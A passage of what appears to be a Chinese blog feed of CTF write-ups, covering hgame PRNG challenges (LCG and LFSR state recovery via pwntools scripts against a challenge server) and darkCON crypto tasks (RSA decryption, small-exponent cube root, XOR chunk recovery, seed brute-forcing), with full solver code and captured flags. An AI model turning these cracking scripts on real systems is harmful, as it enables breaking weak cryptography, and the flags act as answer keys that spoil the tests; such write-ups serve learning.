class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x8=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x9=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x10=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x11=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x12=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        f3=fun3(x6,x7,x8,x9,x10,x11,x12)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(f3))</span><br><span class="line">        print(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        dd=p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> dd ==<span class="string">&#x27;win&#x27;</span>:</span><br><span class="line">            print(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            k=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224055544355.png" alt="image-20210224055544355"></p><h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Cracking^prng_Linear)Congruential&amp;Generators&#125;</span><br></pre></td></tr></table></figure><h1 id="2-寻宝大冒险2"><a href="#2-寻宝大冒险2" class="headerlink" title="2.寻宝大冒险2"></a>2.寻宝大冒险2</h1><h2 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>nc 182.92.108.71 30607</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/yC6oZlPV8OUhYsEb.py?attname=%E5%AF%BB%E5%AE%9D%E5%A4%A7%E5%86%92%E9%99%A92.py&download">附件</a></p><p>基准分数 300</p><p>当前分数 300</p><p>完成人数 14</p></blockquote><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>LSRF，不过在返回的时候使用了|，跟^只差在都为1的时候还没1.故也存在概率。</p><p>当等于20时候，没有正确的话再一次重新运行程序。直到正确为止。</p><h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><p>(没有优化，代码有点难看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">data</span>):</span></span><br><span class="line"></span><br><span class="line">    data = <span class="built_in">bin</span>(<span class="built_in">int</span>(data,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">    LEN = <span class="number">40</span></span><br><span class="line">    LMASK = <span class="number">2</span> ** (LEN + <span class="number">1</span>) - <span class="number">1</span></span><br><span class="line">    MASK = <span class="number">0b1011001010001010000100001000111011110101</span></span><br><span class="line">    key = <span class="number">0b0</span></span><br><span class="line">    init = <span class="built_in">int</span>(data[:LEN - <span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, LEN): </span><br><span class="line">        i = init &amp; MASK &amp; LMASK</span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(LEN - <span class="number">1</span>):</span><br><span class="line">            output ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">            i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">        bit = <span class="built_in">int</span>(data[LEN - n - <span class="number">1</span>]) ^ output</span><br><span class="line">        key |= bit &lt;&lt; n</span><br><span class="line">        init = (init &gt;&gt; <span class="number">1</span>) | (bit &lt;&lt; (LEN - <span class="number">2</span>))  </span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LXFIQNN</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, init, mask, length</span>):</span></span><br><span class="line">        self.init = init</span><br><span class="line">        self.mask = mask</span><br><span class="line">        self.lengthmask = <span class="number">2</span>**(length+<span class="number">1</span>)-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        nextdata = (self.init &lt;&lt; <span class="number">1</span>) &amp; self.lengthmask</span><br><span class="line"></span><br><span class="line">        i = self.init &amp; self.mask &amp; self.lengthmask</span><br><span class="line"></span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            output ^= (i &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            i = i &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        nextdata ^= output</span><br><span class="line"></span><br><span class="line">        self.init = nextdata</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">random</span>(<span class="params">self, nbit</span>):</span></span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">            output &lt;&lt;= <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(&#x27;===&#x27;+str(output))</span></span><br><span class="line">            d=self.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">            output ^= d</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30607</span>)</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line">d=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    print(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="comment"># print(p.recvline()[:].decode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;122&#x27;</span>)</span><br><span class="line">    dd=<span class="built_in">hex</span>(<span class="built_in">int</span>(p.recvline()[<span class="number">27</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()))</span><br><span class="line">    d+=dd[<span class="number">2</span>:]</span><br><span class="line">print(d)</span><br><span class="line">key=fun(d)</span><br><span class="line">prng = LXFIQNN(key, <span class="number">0b1011001010001010000100001000111011110101</span>, <span class="number">40</span>)</span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    secret = prng.random(<span class="number">4</span>)</span><br><span class="line">    t+=<span class="built_in">hex</span>(secret)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">190</span>):</span><br><span class="line">        secret = prng.random(<span class="number">4</span>)</span><br><span class="line">        print(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        p.sendline(<span class="built_in">str</span>(secret))</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)<span class="comment">#防止交互过快，还没接收完信息，服务器中断链接。</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224060035458.png" alt="image-20210224060035458"></p><h3 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;lfsr_121a111y^use-in&amp;crypto&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-寻宝大冒险1&quot;&gt;&lt;a href=&quot;#1-寻宝大冒险1&quot; class=&quot;headerlink&quot; title=&quot;1.寻宝大冒险1&quot;&gt;&lt;/a&gt;1.寻宝大冒险1&lt;/h1&gt;&lt;p&gt;&lt;del&gt;抢了一个三血&lt;/del&gt;&lt;/p&gt;
&lt;h2 id=&quot;Challenge&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>darkCON CTF Crypto&amp;Rev</title>
    <link href="http://example.com/2021/02/22/darkCON-CTF-Crypto-Rev/"/>
    <id>http://example.com/2021/02/22/darkCON-CTF-Crypto-Rev/</id>
    <published>2021-02-22T05:57:03.000Z</published>
    <updated>2021-02-22T15:07:01.308Z</updated>
    
    <content type="html"><![CDATA[<p>-五道密码，三道逆向</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="1-Crypto-Risk-Security-Analyst-Alice-Vs-Eve（21-solves-488-points）"><a href="#1-Crypto-Risk-Security-Analyst-Alice-Vs-Eve（21-solves-488-points）" class="headerlink" title="1.Crypto/Risk Security Analyst Alice Vs Eve（21 solves / 488 points）"></a>1.Crypto/Risk Security Analyst Alice Vs Eve（21 solves / 488 points）</h2><blockquote><p>La Casa De Tuple (L.C.D.T) is a Company in Spain which provides their own End-to-end encryption services and Alice got a job there. It was her first day and her boss told her to manage the <strong>secrets</strong> and encrypt the user data with their new End-to-end encryption system. You are Eve and you’re hired to break into the system. Alice was so overconfident that she gave you everyone’s keys. Can you break their new encryption system and read the chats?</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="string">b&#x27;\xa5\x8f\x82\xf08\xeaH&quot;7\x08:\x02^\xa1\x98\x86&lt;^\x86\x8d\xd5o\xcb\x80\xa2+\x83\x8dQ\xf8\xf7\xf6)3\x15J\xa0s\xc6\xea_\xa3\x0c3\x8aB\xee\xee\xbb\xa4\xe7\xe4\xe9\x01P\x18J\x1e-H&gt;\xff1I\xed\xfaN\x08\xcb\x8b3\xeb\x95\x174\xcb\xef\xe9x\xf7\xf9\xa2eV\x89\x80\x1c\x16`\xaf&amp;\x17\xfa,\x95W\x17Oj\xf2\xba\xfb\xb3\xbe\xca\xe1\x16\xccZ\x16:L\xc4\x82\xbe\xc3\xeb,\xefTx\x83\xcd\xdbw\xf7\xe9\xb1&#x27;</span></span><br><span class="line">,<span class="string">b&#x27;d\xd7\xa9i\x1f!I\xed\xbb\x811\x06\xa2\xb7\x9f\xc7\xdf\xb2L\x15\x10\xea~\x94\x85P\xa0U\xf9\x15v\xa2h\xe6\xb2\xfe\x1b\xdd\x01v\x1a\x85\x85\xc5\xd5\x9e&#123;\x9e\x01&amp;Xh$\xc5\xc4\xbb\x15\xb1\x89y\x94\xaa\xbb\x19P\x8a;u\xc6\\$9\n(\xfc\xccC\xb4\xba\x12UZ3\xdd\xaa\xd5\xa5\xc0&#123;a\x1a?\xf5@\xf4\xfb&#125;w\xb7&amp;\xb2\xb1p\x89j\xd1\xc6\xc4g.g\x17j\x13\xde\x17\x0e\n$\xdcg\x02\x90\xc9\xff\x1a\xc9C&#x27;</span></span><br><span class="line">, <span class="string">b&quot;\xab\xa8HX\xc0\xce\x10DLpm(1O\xbfW[\xf4\xfdm*\xc0\xb2\x14\x86\xa0`\x1fd\xdc\x8a\x86\x8f;Y\x16\xe0.\xea;)\xa9k\xff\xb2\x00F\xfaQ\xa4\xb2\xc4&#x27;I\xb3\x84[\xf52\xb1\xda.?\xf9\xd5.\\tZ\xcd*\t\xb6b\x13\xdf\x0eX\xbd\xe8\xf4B\x1d\x1aJ\x98U?#\xc9\x82\xe0W\xc5\xd2\xfb\xb1\xb8\x13C\x90\xad*m\x06\x95@\xcc\xb4\xf0\xdb\x9a\t\x85\x16\xed\xd3\x84\x18\x11\xe3\x90Z\xbd\xab\x1a\x0bE&quot;</span></span><br><span class="line">, <span class="string">b&#x27;\x84\x876\xa9\xaf\xdd\x11\xdd;c\x99\xeb(\x8d\xe1\xcf\tL\xcf\x12I\xc5\xb4\tl\xaf3\x8ak&quot;a]\x11\x9bG\xf0\nL\x9f\xa0\xdc\xab\x0c\xeeD\x89\xc1\xb8\x15c\x93\xed)\x1d\xf8\xc2w\xb7\xea\xe2\xf5\xa4\x00*o\x13;\t\x11\xe4\xb5\n\xae&#123;\xd9\x8f\x00\n\x96w\x90\xd8?m\xe9\x9b\x11\xd5\xda\xf9\xdb\x91\xce\xa3\xba$\xe8\xfe\xde\xd3YZT\x95\xb1\xf6\xfcrWh\xd8T\x07Q\xdb\x98\xf8\xc3y\xcd_,\xa3\xb23\x88\xbb\xa2&#x27;</span></span><br><span class="line">,<span class="string">b&#x27;\x92?\xe0#\x01z\xf8\xa0\xe8c\xd8w\x9b\x19l\xa1\xba\xaf\xf5m2\x193\x96)\x13\x1c5\x12\xac\x9c\xba|\x19\xb8\xfe\xbe\xc8\xb7\xc0u\xe8&#123;G\x0f\xfa\x9d\x9d\xc0\x01\xbe\x08\x16\x15(;U)pH\xc1 b\xa6FR\xef\xa3\x11\x80\xef\xda\x97\xc0\x9e\\\xeds3Y\xf9B&#123;)&gt;\xed\x97\xf9q\x99\xb4\xb8\xe9A\x9f\x9e\xc6\x9bs\x0f\x12\xcd\x82\xf8ad7qH\x7f\x12\x11\x07\xa5Ws`w*\x15\xa1e6\xb7\x03\xdb\xde\x8d&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=<span class="number">11591820199541996689109613653787526255588052136591796590965030492566464176562040269220119399461110340988231294335751866203503669710592217665562209443382247</span></span><br><span class="line">q=<span class="number">11635054504921733826196411324113633422484567025939176480557681377109499625813425045440075923029853047713076440712050521568931550034720072522577709065411181</span></span><br><span class="line">e=[<span class="number">65537</span>,<span class="number">68719476737</span>,<span class="number">4294967297</span>,<span class="number">1048577</span>,<span class="number">16777217</span>]</span><br><span class="line">n=<span class="number">134871459832923860099882590902411996710996766501756653086495354300954191050110475349218593219906710987168729946490859346117437393705213066464123381634516073655104369957424501917959364716066521838138728063315157921217685558557422845878448233922585713677077217815414960315913375048754314176130997193108410703707</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(e)):</span><br><span class="line">    d=invert(e[i],phi)</span><br><span class="line">    m=<span class="built_in">pow</span>(bytes_to_long(enc[i]),d,n)</span><br><span class="line">    print(long_to_bytes(m))</span><br><span class="line"><span class="string">b&#x27;Hi everyone! Are you enjoing darkCON?\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;Hell yeah! Charlie, do you have the secret thing?\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;Got it! darkCON&#123;4m_I_n0t_supp0sed_t0_g1v3_d???&#125;\n&#x27;</span></span><br><span class="line"><span class="string">b&#x27;[Sush]...[Sussshhh]... Eve Eve...Eve is there!\n&#x27;</span></span><br><span class="line"><span class="string">b&quot;Nah...She doesn&#x27;t even have our Private Keys&quot;</span></span><br></pre></td></tr></table></figure><h2 id="2-Crypto-Take-It-Easy-99-solves-428-points"><a href="#2-Crypto-Take-It-Easy-99-solves-428-points" class="headerlink" title="2.Crypto/Take It Easy(99 solves / 428 points)"></a>2.Crypto/Take It Easy(99 solves / 428 points)</h2><p>先找到压缩包密码，密码解那个txt文件的rsa即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">147310848610710067833452759772211595299756697892124273309283511558003008852730467644332450478086759935097628336530735607168904129699752266056721879451840506481443745340509935333411835837548485362030793140972434873394072578851922470507387225635362369992377666988296887264210876834248525673247346510754984183551</span></span><br><span class="line">ct = <span class="number">43472086389850415096247084780348896011812363316852707174406536413629129</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">m=iroot(ct,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment">#key=Ju5t_@_K3Y</span></span><br></pre></td></tr></table></figure><p>分析源码可知，将flag分成了7个组然后隔着一个组两两异或。那就逐个恢复。</p><p>且由于第一组第二组明文已知</p><p>根据异或的对称性</p><p>即第一组异或第三组密文，第二组异或第四组密文。。</p><p>可以恢复第三第四组明文，然后再拿这两组继续操作，最后组合即可得到完整flag，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line">flag = <span class="string">b&quot;darkCON&#123;n0T_Th@t_haRd_r1Ght&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Tup_Int</span>(<span class="params">chunk</span>):</span></span><br><span class="line"><span class="keyword">return</span> unpack(<span class="string">&quot;I&quot;</span>,chunk)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">chunks = [flag[i*<span class="number">4</span>:(i+<span class="number">1</span>)*<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)//<span class="number">4</span>)]</span><br><span class="line">print(chunks)</span><br><span class="line">ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chunks) - <span class="number">2</span>):</span><br><span class="line">block = pack(<span class="string">&quot;I&quot;</span>, Tup_Int(chunks[i]) ^ Tup_Int(chunks[i+<span class="number">2</span>]))</span><br><span class="line">ciphertext = <span class="string">&#x27;B&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27; : &#x27;</span> + <span class="built_in">str</span>(block) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">print(ciphertext)</span><br><span class="line"><span class="comment">#darkCON&#123;n0T_Th@t_haRd_r1Ght&#125;</span></span><br></pre></td></tr></table></figure><h2 id="3-Crypto-Tony-And-James-45-solves-472-points"><a href="#3-Crypto-Tony-And-James-45-solves-472-points" class="headerlink" title="3.Crypto/Tony And James(45 solves / 472 points)"></a>3.Crypto/Tony And James(45 solves / 472 points)</h2><p>题目：（拿了个二血）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_seed</span>(<span class="params">l</span>):</span></span><br><span class="line">seed = <span class="number">0</span></span><br><span class="line">rand = random.getrandbits(l)</span><br><span class="line">raw = <span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> rand &gt; <span class="number">0</span>:</span><br><span class="line">rand = rand &gt;&gt; <span class="number">1</span></span><br><span class="line">seed += rand</span><br><span class="line">raw.append(rand)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(raw) == l:</span><br><span class="line"><span class="keyword">return</span> raw, seed</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> get_seed(l)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">m</span>):</span></span><br><span class="line">l = <span class="built_in">len</span>(m)</span><br><span class="line"></span><br><span class="line">raw, seed = get_seed(l)</span><br><span class="line">random.seed(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;encrypted.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">r = random.randint(<span class="number">1</span>, <span class="number">2</span>**<span class="number">512</span>)</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">print(<span class="string">&quot;r0 =&quot;</span>,r)</span><br><span class="line">encoded = <span class="built_in">hex</span>(r ^ m[i] ^ raw[i])[<span class="number">2</span>:]</span><br><span class="line">f.write(<span class="string">f&quot;F<span class="subst">&#123;i&#125;</span>:  <span class="subst">&#123;encoded&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">m = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line">encrypt(m.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先根据已知条件爆破出seed</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_seed</span>(<span class="params">l</span>):</span></span><br><span class="line">    seed = <span class="number">8926184294774128254</span></span><br><span class="line">    rand = <span class="number">8926184294774128254</span></span><br><span class="line">    raw = [<span class="number">8926184294774128254</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> rand &gt; <span class="number">0</span>:</span><br><span class="line">        rand = rand &gt;&gt; <span class="number">1</span></span><br><span class="line">        seed += rand</span><br><span class="line">        raw.append(rand)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(raw) == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> raw, seed</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> get_seed(l)</span><br><span class="line">raw, seed = get_seed(<span class="number">64</span>)</span><br><span class="line">print(raw)</span><br><span class="line">print(seed)</span><br><span class="line"><span class="comment">#seed=17852368589548256470</span></span><br></pre></td></tr></table></figure><p>然后根据异或的对称性解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#求出种子</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">seed=<span class="number">17852368589548256470</span></span><br><span class="line"></span><br><span class="line">random.seed(seed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">raw=[<span class="number">8926184294774128254</span>, <span class="number">4463092147387064127</span>, <span class="number">2231546073693532063</span>, <span class="number">1115773036846766031</span>, <span class="number">557886518423383015</span>, <span class="number">278943259211691507</span>, <span class="number">139471629605845753</span>, <span 